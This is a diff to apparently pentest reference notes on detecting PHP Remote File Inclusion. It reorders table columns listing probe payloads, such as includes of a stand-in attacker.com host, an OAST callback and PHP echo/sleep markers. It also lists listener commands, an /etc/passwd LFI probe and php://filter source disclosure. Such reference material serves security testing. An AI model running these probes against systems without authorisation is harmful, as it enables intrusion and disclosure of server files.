@@ -48,21 +48,21 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Basic HTTP | `?page=http://attacker.com/test.php` | If executed → RFI active. |
-| HTTPS | `?page=https://attacker.com/test.php` | TLS variant. |
-| Burp Collaborator | `?page=http://<id>.oast.fun/test.php` | Auto-detect callback. |
+| `?page=http://attacker.com/test.php` | Basic HTTP | If executed → RFI active. |
+| `?page=https://attacker.com/test.php` | HTTPS | TLS variant. |
+| `?page=http://<id>.oast.fun/test.php` | Burp Collaborator | Auto-detect callback. |
 | Domain you control | Setup own listener | Standard. |
-| Force-load benign | `<?php phpinfo(); ?>` con phpinfo en payload | Confirm execution. |
-| Echo marker | `<?php echo "RFI-CONFIRMED"; ?>` | Simple test. |
-| Time-delay test | `<?php sleep(10); ?>` | Confirm executes. |
-| HTTP server simple | `python3 -m http.server 80` | Quick listener. |
-| nc listener | `nc -lvnp 80` | Verify HTTP request received. |
+| `<?php phpinfo(); ?>` con phpinfo en payload | Force-load benign | Confirm execution. |
+| `<?php echo "RFI-CONFIRMED"; ?>` | Echo marker | Simple test. |
+| `<?php sleep(10); ?>` | Time-delay test | Confirm executes. |
+| `python3 -m http.server 80` | HTTP server simple | Quick listener. |
+| `nc -lvnp 80` | nc listener | Verify HTTP request received. |
 | Multiple paths probe | Iterate per param | Bulk discovery. |
 | Verbose error response | Triggers PHP error if RFI tries fail | Indicator. |
 | Allow_url_include = On indicator | Successful HTTP fetch + execution | Confirms config. |
 | `data://` probe | Inline alternative | Same family. |
 | `php://input` probe | POST body include | Alternative. |
-| Differential path response | `local.txt` (LFI works) vs `http://...` (RFI works) | Identify which feature. |
+| `local.txt` (LFI works) vs `http://...` (RFI works) | Differential path response | Identify which feature. |
 ^rfi-detect-probes
 
 ### Probe rápido
@@ -90,21 +90,21 @@ curl -s "${TARGET}?${PARAM}=http://${COLLAB}/test"
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| PHP version header | `X-Powered-By: PHP/x.y.z` response header | Standard. |
-| phpinfo() page | `/phpinfo.php`, `/info.php`, `/test.php` | Discovery. |
+| `X-Powered-By: PHP/x.y.z` response header | PHP version header | Standard. |
+| `/phpinfo.php`, `/info.php`, `/test.php` | phpinfo() page | Discovery. |
 | Error message PHP version | Verbose errors mention version | Standard. |
-| Cookie session | `PHPSESSID=...` confirms PHP | Stack confirm. |
+| `PHPSESSID=...` confirms PHP | Cookie session | Stack confirm. |
 | `allow_url_include = On` | Required for HTTP RFI | Critical config. |
 | `allow_url_fopen = On` | Required for any URL fetch | Adjacent. |
-| PHP 5.2.0+ default | `allow_url_include = Off` | Modern PHP. |
+| `allow_url_include = Off` | PHP 5.2.0+ default | Modern PHP. |
 | Pre-PHP 5.2 | Default On — vulnerable | Legacy. |
-| Test via wrapper | `?page=php://filter/...` confirms PHP | Stack confirm. |
-| LFI works but RFI fails | `allow_url_include = Off` likely | Inferer. |
+| `?page=php://filter/...` confirms PHP | Test via wrapper | Stack confirm. |
+| `allow_url_include = Off` likely | LFI works but RFI fails | Inferer. |
 | Specific file disclosure | Try `?page=/etc/passwd` (LFI) vs `?page=http://...` (RFI) | Distinguish. |
-| Server header | `Apache`, `nginx + PHP-FPM` | Stack hint. |
+| `Apache`, `nginx + PHP-FPM` | Server header | Stack hint. |
 | Response time differential | Remote fetch slower than local include | Indicator. |
 | Combine con error hunting | Trigger PHP errors for version + paths | Recon. |
-| Source disclosure via LFI | `php://filter/convert.base64-encode` | Read PHP source con LFI. |
+| `php://filter/convert.base64-encode` | Source disclosure via LFI | Read PHP source con LFI. |
 ^rfi-detect-php
 
 ### Workflow detect PHP + RFI capability
